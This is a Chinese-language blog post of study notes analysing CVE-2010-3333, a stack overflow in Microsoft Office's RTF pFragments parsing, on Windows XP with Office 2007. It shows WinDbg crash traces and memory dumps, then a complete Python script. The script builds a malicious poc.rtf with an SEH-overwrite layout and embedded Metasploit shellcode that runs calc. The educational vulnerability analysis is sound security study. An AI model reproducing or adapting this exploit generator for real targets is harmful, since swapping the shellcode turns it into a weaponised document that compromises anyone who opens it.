<!DOCTYPE html>
<html>
<head>
    
<!-- Google Analytics -->
<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-81250907-1', 'auto');
ga('send', 'pageview');
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
<!-- End Google Analytics -->


    

    



    <meta charset="utf-8">
    
    
    
    <title>漏洞战争笔记之Cve-2010-3333 | 我的世界 | 0.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="漏洞战争,漏洞分析">
    <meta name="description" content="实验环境： windows xp sp3 pro office 2007">
<meta name="keywords" content="漏洞战争,漏洞分析">
<meta property="og:type" content="article">
<meta property="og:title" content="漏洞战争笔记之Cve-2010-3333">
<meta property="og:url" content="http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/index.html">
<meta property="og:site_name" content="我的世界">
<meta property="og:description" content="实验环境： windows xp sp3 pro office 2007">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2017-07-09T06:19:46.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="漏洞战争笔记之Cve-2010-3333">
<meta name="twitter:description" content="实验环境： windows xp sp3 pro office 2007">
    
        <link rel="alternate" type="application/atom+xml" title="我的世界" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>
</head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/d2024a8a998c8d3e4ba842e40223c23dfe1026c8bbf3-OudiPA_fw580.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">ench4nt3r</h5>
          <a href="mailto:82369082@qq.com" title="82369082@qq.com" class="mail">82369082@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/ench4nt3r" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">漏洞战争笔记之Cve-2010-3333</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">漏洞战争笔记之Cve-2010-3333</h1>
        <h5 class="subtitle">
            
                <time datetime="2016-11-19T16:00:00.000Z" itemprop="datePublished" class="page-time">
  2016-11-20
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#诡异的运算"><span class="post-toc-number">1.</span> <span class="post-toc-text">诡异的运算</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EXP"><span class="post-toc-number">2.</span> <span class="post-toc-text">EXP</span></a></li></ol>
        </nav>
    </aside>
    
<article id="post-漏洞战争笔记之Cve-2010-3333"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">漏洞战争笔记之Cve-2010-3333</h1>
        <div class="post-meta">
            <time class="post-time" title="2016-11-20 00:00:00" datetime="2016-11-19T16:00:00.000Z"  itemprop="datePublished">2016-11-20</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <p>实验环境：</p>
<p>windows xp sp3 pro</p>
<p>office 2007</p>
<a id="more"></a>
<h3 id="诡异的运算"><a href="#诡异的运算" class="headerlink" title="诡异的运算"></a>诡异的运算</h3><p>书上有讲，打开poc后会断在<code>rep movs dword ptr es:[edi], dword ptr [esi]</code>，然而并没有。</p>
<p>将windbg附上winword.exe，打开poc，windbg停在了这里：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">(5d4.60c): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=3c524228 ebx=00000000 ecx=0011fe34 edx=00000000 esi=0107c398 edi=0011fff0</div><div class="line">eip=32cf3814 esp=0011fde8 ebp=0011fde8 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</div><div class="line">mso!Ordinal7356+0x1315:</div><div class="line">32cf3814 8b4804          mov     ecx,dword ptr [eax+4] ds:0023:3c52422c=????????</div></pre></td></tr></table></figure></p>
<p>瞅瞅<code>eax</code>的值从哪来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ub @eip</div><div class="line">mso!Ordinal7356+0x12fd:</div><div class="line">32cf37fc 0000            add     byte ptr [eax],al</div><div class="line">32cf37fe 3442            xor     al,42h</div><div class="line">32cf3800 b301            mov     bl,1</div><div class="line">32cf3802 e97cffffff      jmp     mso!Ordinal7356+0x1284 (32cf3783)</div><div class="line">32cf3807 55              push    ebp</div><div class="line">32cf3808 8bec            mov     ebp,esp</div><div class="line">32cf380a 8b450c          mov     eax,dword ptr [ebp+0Ch]</div><div class="line">32cf380d 8d04c52038cf32  lea     eax,mso!Ordinal7356+0x1321 (32cf3820)[eax*8]</div></pre></td></tr></table></figure></p>
<p>在<code>32cf380a</code>下个断点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0:006&gt; g</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0011fdfc ebx=00000000 ecx=0011fe34 edx=00000000 esi=0107c3b0 edi=0011fff0</div><div class="line">eip=32cf380a esp=0011fde8 ebp=0011fde8 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</div><div class="line">mso!Ordinal7356+0x130b:</div><div class="line">32cf380a 8b450c          mov     eax,dword ptr [ebp+0Ch] ss:0023:0011fdf4=41306141</div></pre></td></tr></table></figure></p>
<p>用编辑器打开poc，搜索<code>41613041</code>，搜索命中，看来这个数据是从poc里拿过来的。现在来看看调用栈，看看它来自何方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0:000&gt; kb 5</div><div class="line">ChildEBP RetAddr  Args to Child              </div><div class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</div><div class="line">0011fde8 32e5944d 0011fdfc 41306141 05000000 mso!Ordinal7356+0x130b</div><div class="line">0011fe04 32e595bf 41306141 41386141 0011fe34 mso!Ordinal2605+0x326e</div><div class="line">0011fe3c 37614136 41386141 62413961 31624130 mso!Ordinal2605+0x33e0</div><div class="line">0011fe40 41386141 62413961 31624130 41326241 0x37614136</div><div class="line">0011fe44 62413961 31624130 41326241 62413362 0x41386141</div></pre></td></tr></table></figure></p>
<p>可以看见<code>41306141</code>最后出现的位置是在<code>0011fe04 32e595bf 41306141 41386141 0011fe34 mso!Ordinal2605+0x326e</code>。</p>
<p>看看<code>32e595bf</code>处的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ub 32e595bf L14</div><div class="line">mso!Ordinal2605+0x33a9:</div><div class="line">32e59588 ff750c          push    dword ptr [ebp+0Ch]</div><div class="line">32e5958b 8b7064          mov     esi,dword ptr [eax+64h]</div><div class="line">32e5958e 8365f800        and     dword ptr [ebp-8],0</div><div class="line">32e59592 8b06            mov     eax,dword ptr [esi]</div><div class="line">32e59594 8d4df0          lea     ecx,[ebp-10h]</div><div class="line">32e59597 51              push    ecx</div><div class="line">32e59598 bb00000005      mov     ebx,5000000h</div><div class="line">32e5959d 56              push    esi</div><div class="line">32e5959e 895df4          mov     dword ptr [ebp-0Ch],ebx</div><div class="line">32e595a1 ff501c          call    dword ptr [eax+1Ch]</div><div class="line">32e595a4 8b4514          mov     eax,dword ptr [ebp+14h]</div><div class="line">32e595a7 ff7518          push    dword ptr [ebp+18h]</div><div class="line">32e595aa f7d8            neg     eax</div><div class="line">32e595ac 1bc0            sbb     eax,eax</div><div class="line">32e595ae 8d4df8          lea     ecx,[ebp-8]</div><div class="line">32e595b1 23c1            and     eax,ecx</div><div class="line">32e595b3 50              push    eax</div><div class="line">32e595b4 ff7508          push    dword ptr [ebp+8]</div><div class="line">32e595b7 ff75f0          push    dword ptr [ebp-10h]</div><div class="line">32e595ba e85cfeffff      call    mso!Ordinal2605+0x323c (32e5941b)</div></pre></td></tr></table></figure></p>
<p>第一个参数来自<code>[ebp-10h]</code>，并且在上面的代码中，看起来似乎是在这里<code>32e595a1 ff501c          call    dword ptr [eax+1Ch]</code>填充了它，来确定一下是不是跟我们说的一样，在<code>32e595a1</code>下个断点。</p>
<p>调用之前：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Breakpoint 2 hit</div><div class="line">eax=32a0c8c4 ebx=05000000 ecx=0011fe2c edx=00000300 esi=0107c518 edi=0011fff0</div><div class="line">eip=32e595a1 esp=0011fe10 ebp=0011fe3c iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">mso!Ordinal2605+0x33c2:</div><div class="line">32e595a1 ff501c          call    dword ptr [eax+1Ch]  ds:0023:32a0c8e0=327c002c</div><div class="line">0:000&gt; db ebp-10</div><div class="line">0011fe2c  76 00 fe 00 00 00 00 05-00 00 00 00 fe 00 ff ff  v...............</div><div class="line">0011fe3c  6c fe 11 00 f4 96 e5 32-a8 ff 11 00 00 00 00 00  l......2........</div><div class="line">0011fe4c  ff ff ff ff 00 00 00 00-18 08 61 04 50 0d 12 00  ..........a.P...</div><div class="line">0011fe5c  b4 04 12 00 10 01 12 00-ce de c9 47 00 00 00 00  ...........G....</div><div class="line">0011fe6c  c8 00 12 00 bb 98 e5 32-f0 ff 11 00 a8 ff 11 00  .......2........</div><div class="line">0011fe7c  00 00 00 00 18 08 61 04-00 00 00 00 b4 04 12 00  ......a.........</div><div class="line">0011fe8c  10 01 12 00 00 00 00 00-ff ff ff ff ff ff ff ff  ................</div><div class="line">0011fe9c  ff ff ff ff 00 00 00 00-00 00 00 20 00 01 01 00  ........... ....</div></pre></td></tr></table></figure></p>
<p>调用之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0:000&gt; p</div><div class="line">eax=0011fe2c ebx=05000000 ecx=00000000 edx=00000000 esi=0107c518 edi=0011fff0</div><div class="line">eip=32e595a4 esp=0011fe1c ebp=0011fe3c iopl=0         nv up ei pl nz ac po nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212</div><div class="line">mso!Ordinal2605+0x33c5:</div><div class="line">32e595a4 8b4514          mov     eax,dword ptr [ebp+14h] ss:0023:0011fe50=41326241</div><div class="line">0:000&gt; db ebp-10</div><div class="line">0011fe2c  41 61 30 41 61 31 41 61-32 41 61 33 41 61 34 41  Aa0Aa1Aa2Aa3Aa4A</div><div class="line">0011fe3c  61 35 41 61 36 41 61 37-41 61 38 41 61 39 41 62  a5Aa6Aa7Aa8Aa9Ab</div><div class="line">0011fe4c  30 41 62 31 41 62 32 41-62 33 41 62 34 41 62 35  0Ab1Ab2Ab3Ab4Ab5</div><div class="line">0011fe5c  41 62 36 41 62 37 41 62-38 41 62 39 41 63 30 41  Ab6Ab7Ab8Ab9Ac0A</div><div class="line">0011fe6c  63 31 41 63 32 41 63 33-41 63 34 41 63 35 41 63  c1Ac2Ac3Ac4Ac5Ac</div><div class="line">0011fe7c  36 41 63 37 41 63 38 41-63 39 41 64 30 41 64 31  6Ac7Ac8Ac9Ad0Ad1</div><div class="line">0011fe8c  41 64 32 41 64 33 41 64-34 41 64 35 41 64 36 41  Ad2Ad3Ad4Ad5Ad6A</div><div class="line">0011fe9c  64 37 41 64 38 41 64 39-41 65 30 41 65 31 41 65  d7Ad8Ad9Ae0Ae1Ae</div></pre></td></tr></table></figure></p>
<p>一般情况下，<code>[ebp+4]</code>存储着函数返回地址，调用之前<code>[ebp+4]</code>存储的是<code>f4 96 e5 32</code>，调用之后存储的是<code>36 41 61 37</code>。（此事说明了溢出发生）</p>
<p>现在，回到书上看看，<code>32e595a1</code>的上下内容跟书上40页讲的一致。</p>
<p>跟书上不一样的原因应该是，我的栈有足够大的空间容纳这些字符串，而书上没有，所以书上在memcpy就触发了异常，而我的跑到<code>mov     ecx,dword ptr [eax+4]</code>才抛出异常。在书的44页也有讲到<code>mov     ecx,dword ptr [eax+4]</code>这个诡异的运算。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</div><div class="line"><span class="keyword">from</span> mako.template <span class="keyword">import</span> Template</div><div class="line"></div><div class="line"><span class="comment"># windows/exec - 189 bytes</span></div><div class="line"><span class="comment"># http://www.metasploit.com</span></div><div class="line"><span class="comment"># VERBOSE=false, PrependMigrate=false, EXITFUNC=process,</span></div><div class="line"><span class="comment"># CMD=calc</span></div><div class="line">buf = <span class="string">""</span></div><div class="line">buf += <span class="string">"fce8820000006089e531c0648b"</span></div><div class="line">buf += <span class="string">"50308b520c8b52148b72280fb7"</span></div><div class="line">buf += <span class="string">"4a2631ffac3c617c022c20c1cf"</span></div><div class="line">buf += <span class="string">"0d01c7e2f252578b52108b4a3c"</span></div><div class="line">buf += <span class="string">"8b4c1178e34801d1518b592001"</span></div><div class="line">buf += <span class="string">"d38b4918e33a498b348b01d631"</span></div><div class="line">buf += <span class="string">"ffacc1cf0d01c738e075f6037d"</span></div><div class="line">buf += <span class="string">"f83b7d2475e4588b582401d366"</span></div><div class="line">buf += <span class="string">"8b0c4b8b581c01d38b048b01d0"</span></div><div class="line">buf += <span class="string">"894424245b5b61595a51ffe05f"</span></div><div class="line">buf += <span class="string">"5f5a8b12eb8d5d6a018d85b200"</span></div><div class="line">buf += <span class="string">"00005068318b6f87ffd5bbf0b5"</span></div><div class="line">buf += <span class="string">"a25668a695bd9dffd53c067c0a"</span></div><div class="line">buf += <span class="string">"80fbe07505bb4713726f6a0053"</span></div><div class="line">buf += <span class="string">"ffd563616c6300"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_int</span><span class="params">(v)</span>:</span></div><div class="line">    array = format(v, <span class="string">'x'</span>)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(array) % <span class="number">2</span>:</div><div class="line">        array = <span class="string">'0'</span> + array</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(array[i<span class="number">-2</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(array), <span class="number">0</span>, <span class="number">-2</span>))</div><div class="line"></div><div class="line"></div><div class="line">length = <span class="number">0xc8ac</span></div><div class="line"></div><div class="line">exp = <span class="string">'1'</span> * <span class="number">0x10</span> * <span class="number">2</span></div><div class="line"></div><div class="line">exp += <span class="string">'1'</span> * <span class="number">4</span> * <span class="number">2</span></div><div class="line"></div><div class="line"><span class="comment"># 函数返回地址的位置，放置jmp esp的地址</span></div><div class="line"><span class="comment">#exp += encode_int(0x76a7068d)</span></div><div class="line">exp += <span class="string">'90909090'</span></div><div class="line"></div><div class="line">exp += <span class="string">'2'</span> * <span class="number">0x10</span> * <span class="number">2</span></div><div class="line"></div><div class="line"><span class="comment"># ebp + 0x18 = 0 跳过诡异的运算</span></div><div class="line"><span class="comment">#exp += '0' * 8</span></div><div class="line">exp += <span class="string">'1'</span> * <span class="number">8</span> <span class="comment"># 异常</span></div><div class="line"></div><div class="line"><span class="comment"># jmp esp</span></div><div class="line">exp += buf</div><div class="line"></div><div class="line"><span class="comment"># 到异常链的填充</span></div><div class="line">exp += <span class="string">'3'</span> * (<span class="number">0x1718</span> - len(buf)/<span class="number">2</span>) * <span class="number">2</span></div><div class="line"></div><div class="line"><span class="comment"># next SEH</span></div><div class="line">exp += <span class="string">'eb06ebf8'</span></div><div class="line"><span class="comment"># SEH Handle</span></div><div class="line">exp += <span class="string">'0b0b2800'</span></div><div class="line"><span class="comment"># jmp shellcode</span></div><div class="line">exp += <span class="string">'e9dbe8ffff'</span></div><div class="line"></div><div class="line">exp += <span class="string">'1'</span> * (length - len(exp))</div><div class="line"></div><div class="line">t = Template(filename=<span class="string">'./template.txt'</span>)</div><div class="line">ttf = t.render(length=encode_int(length), content=exp)</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'poc.rtf'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</div><div class="line">    f.write(ttf)</div></pre></td></tr></table></figure></p>
<p>template.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;\rtf1&#123;\shp&#123;\sp&#123;\sn pFragments&#125;&#123;\sv 1;7;11111111$&#123;length&#125;$&#123;content&#125;&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure></p>

        </div>

        <blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2017-07-09T06:19:46.000Z" itemprop="dateUpdated">2017-07-09 14:19:46</time>
</span><br>


        
        本文章仅供学习交流，请勿用于其他用途。如果侵犯了您的权力，请与本人联系。</br>转载请注明出处：<a href="/2016/11/20/漏洞战争笔记之Cve-2010-3333/" target="_blank" rel="external">http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/</a>
        
    </div>
    <footer>
        <a href="http://www.ench4nt3r.com">
            <img src="/img/d2024a8a998c8d3e4ba842e40223c23dfe1026c8bbf3-OudiPA_fw580.jpg" alt="ench4nt3r">
            ench4nt3r
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞战争/">漏洞战争</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/&title=《漏洞战争笔记之Cve-2010-3333》 — 我的世界&pic=http://www.ench4nt3r.com/img/d2024a8a998c8d3e4ba842e40223c23dfe1026c8bbf3-OudiPA_fw580.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/&title=《漏洞战争笔记之Cve-2010-3333》 — 我的世界&source=实验环境：
windows xp sp3 pro
office 2007" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《漏洞战争笔记之Cve-2010-3333》 — 我的世界&url=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/&via=http://www.ench4nt3r.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2016/11/20/Cve-2012-1876-exploit/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Cve-2012-1876 exploit</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2016/10/04/WindowsXP堆思维导图/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">WindowsXP堆思维导图</h4>
      </a>
    </div>
  
</nav>



    





<section class="comments" id="comments">
    <!-- UY BEGIN -->
    <div id="uyan_frame"></div>
    <script src="http://v2.uyan.cc/code/uyan.js?uid=2138344"></script>
    <!-- UY END -->
</section>










</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>ench4nt3r &copy; 2016 - 2018</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/&title=《漏洞战争笔记之Cve-2010-3333》 — 我的世界&pic=http://www.ench4nt3r.com/img/d2024a8a998c8d3e4ba842e40223c23dfe1026c8bbf3-OudiPA_fw580.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/&title=《漏洞战争笔记之Cve-2010-3333》 — 我的世界&source=实验环境：
windows xp sp3 pro
office 2007" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《漏洞战争笔记之Cve-2010-3333》 — 我的世界&url=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/&via=http://www.ench4nt3r.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.ench4nt3r.com/2016/11/20/漏洞战争笔记之Cve-2010-3333/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
